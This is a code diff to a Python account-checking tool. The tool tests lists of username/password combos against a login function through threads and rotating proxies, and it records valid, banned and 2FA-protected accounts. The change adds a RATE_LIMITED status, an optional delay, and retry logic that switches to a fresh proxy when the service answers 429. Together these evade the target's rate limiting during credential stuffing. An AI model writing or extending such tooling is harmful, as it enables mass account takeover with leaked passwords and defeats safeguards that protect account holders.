@@ -3,6 +3,7 @@
 from __future__ import annotations
 
 import threading
+import time
 from concurrent.futures import ThreadPoolExecutor, as_completed
 
 from auth import check_account
@@ -21,6 +22,7 @@ class CheckerStats:
         self.banned = 0
         self.twofa = 0
         self.errors = 0
+        self.rate_limited = 0
         self._lock = threading.Lock()
 
     def update(self, result: AccountResult):
@@ -35,6 +37,8 @@ class CheckerStats:
                 self.invalid += 1
             elif result.status == "BANNED":
                 self.banned += 1
+            elif result.status == "RATE_LIMITED":
+                self.rate_limited += 1
             else:
                 self.errors += 1
 
@@ -59,6 +63,7 @@ def run_checker(
     proxy_manager: ProxyManager | None = None,
     threads: int = 10,
     timeout: int = 15,
+    delay: float = 0,
     callback=None,
 ) -> list[AccountResult]:
     """Run the checker on all combos with threading."""
@@ -68,12 +73,34 @@ def run_checker(
 
     def _check_one(combo: tuple[str, str]) -> AccountResult:
         username, password = combo
+
+        if delay > 0:
+            time.sleep(delay)
+
         proxy = proxy_manager.get() if proxy_manager else None
         result = check_account(username, password, proxy=proxy, timeout=timeout)
 
-        # If proxy failed, retry without proxy as fallback
+        # If proxy failed, retry without proxy
         if result.status == "ERROR" and proxy and "Proxy" in result.error_message:
             result = check_account(username, password, proxy=None, timeout=timeout)
+
+        # If rate limited, wait and retry with a different proxy
+        if result.status == "RATE_LIMITED" or (
+            result.status == "ERROR" and "429" in result.error_message
+        ):
+            result.status = "RATE_LIMITED"
+            time.sleep(3)
+            new_proxy = proxy_manager.get() if proxy_manager else None
+            # Use a different proxy if available, otherwise wait longer
+            if new_proxy and new_proxy != proxy:
+                result = check_account(
+                    username, password, proxy=new_proxy, timeout=timeout
+                )
+            else:
+                time.sleep(5)
+                result = check_account(
+                    username, password, proxy=new_proxy, timeout=timeout
+                )
 
         stats.update(result)
         with results_lock:
